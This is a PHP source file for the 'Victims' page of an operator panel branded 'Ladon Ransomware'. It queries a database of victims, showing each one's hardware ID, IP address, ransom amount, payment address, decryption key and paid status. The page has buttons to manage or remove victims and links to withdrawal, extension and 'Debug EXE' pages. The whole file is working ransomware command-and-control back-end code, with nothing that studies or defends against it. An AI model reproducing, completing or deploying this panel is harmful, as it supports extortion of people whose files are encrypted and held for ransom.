<?php
include_once("config.php");

if(!empty($_GET['remove'])){
    $shit = $_GET['remove'];
    $rmz = "DELETE FROM `ransomware` WHERE `id` = :id AND `username` = :username";
            if($sth = $db->prepare($rmz)){
                $sth->bindParam(":id", $shit);
                $sth->bindParam(":username", $session);
                $sth->execute();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
        <meta name="description" content="">
        <meta name="keyword" content="">

        <title>Ladon Ransomware</title>

        <link href="assets/css/bootstrap.min.css" rel="stylesheet">
        <link href="assets/css/slidebars.min.css" rel="stylesheet">
        <link href="assets/css/icons.css" rel="stylesheet">
        <link href="assets/css/menu.css" rel="stylesheet" type="text/css">
        <link href="assets/css/style.css" rel="stylesheet">
    </head>

    <body class="sticky-header">
        <section>
            <!-- sidebar left start-->
            <div class="sidebar-left">
                <div class="sidebar-left-info">
  
                                        
                    <!--sidebar nav start-->
                    <ul class="side-navigation">
                        <li class="active">
                            <a href="index.php"><span>Dashboard</span></a>
                        </li>
                       
                         <li class="active"><a href="data.php"> <span>Victims</span></a>
                        </li>
                        <li class="active"><a href="withdraw.php"> <span>Withdrawl</span></a>
                        </li>

                        <li class="active"><a href="extensions.php"> <span>Extensions</span></a>
                        </li>
			<li class="active"><a href="debug.php"> <span>Debug EXE</span></a>
                        </li>
			<li class="active"><a href="pass.php"> <span>Change Password</span></a>
                        </li>
                        <?php

                         if($session == hash('sha256', "admin"))
                        { ?>
                        <li class="active"><a href="users.php"> <span>Add Users</span></a>
                        </li>
                        <?php
                        }
                            ?>

                        <li class="active"><a href="logout.php"> <span>LogOut</span></a>
                        </li>
                    </ul><!--sidebar nav end-->
                </div>
            </div><!-- sidebar left end-->

            <!-- body content start-->
            <div class="body-content">
                <!-- header section start-->
                <div class="header-section">
                    <!--logo and logo icon start-->
                    <div class="logo">
                        <a href="index.php">
                            <!--<i class="fa fa-maxcdn"></i>-->
                            <span class="brand-name">LADON RANSOMWARE</span>
                        </a>
                    </div>

                    <!--toggle button start-->
                    <a class="toggle-btn"><i class="ti ti-menu"></i></a>
                    <!--toggle button end-->

                  

                </div>
                <!-- header section end-->

                <div class="container-fluid">
                    <div class="page-head">
                        <h4 class="mt-2 mb-2">Victims</h4>
                    </div>



                    <div class="row">
                        <div class="col-lg-12 col-sm-12">
                            <div class="card m-b-30">
                                <div class="card-body">
                                    <h5 class="header-title pb-3">Your Victims</h5>           
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="table-responsive">
                                                <table class="table table-hover m-b-0">
                                                    <thead>
                                                        <tr>
                                                            <th>HWID</th>
                                                            <th>IP</th>
                                                            <th>Ransom Amount</th>
                                                            <th>Address</th>
                                                            <th>Key</th>
                                                            <th>Paid?</th>
                                                            <th>Options</th>
                                                        </tr>
                                                    </thead>
                                                    <tbody>
                                                    	
                                                    	<?php

 										$table = "SELECT * FROM `ransomware` WHERE `username` = :username";
                                                        if($sth = $db->prepare($table)){
                                                            $sth->bindParam(':username', $session);
                                                            $sth->execute();
                                                            if($sth->rowCount() > 0 ){
                                                            
                                                            while( $row = $sth->fetch(PDO::FETCH_ASSOC) ) {
                                                                echo "<tr><td>".htmlentities($row["HWID"], ENT_QUOTES)."</td><td>".htmlentities($row["ip"], ENT_QUOTES)."</td><td>".htmlentities($row["amount"], ENT_QUOTES)."</td><td>".htmlentities($row["address"], ENT_QUOTES)."</td><td><textarea>".htmlentities($row["key"], ENT_QUOTES)."</textarea></td><td>".htmlentities($row["paid"], ENT_QUOTES)."</td><td>
                                            <a href='manage.php?id=".htmlentities($row["contactid"], ENT_QUOTES)."' type='submit' class='btn btn-primary'>Manage Victim </a><a href='data.php?remove=".htmlentities($row["id"], ENT_QUOTES)."' type='submit' class='btn btn-primary'>Remove Victim </a></td></tr>";
                                                            }
                                                            }

                                                        }

                                                    	?>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>              
                                </div>
                            </div>
                        </div>

                        
                    </div>                            
                    
                </div><!--end container-->

                <!--footer section start-->
                <footer class="footer">
                    LANDON RANSOMWARE
                </footer>
                <!--footer section end-->



            </div>
            <!--end body content-->
        </section>

        
        <script src="assets/js/jquery-3.2.1.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery-migrate.js"></script>
        <script src="assets/js/jquery.slimscroll.min.js"></script>

    </body>
</html>

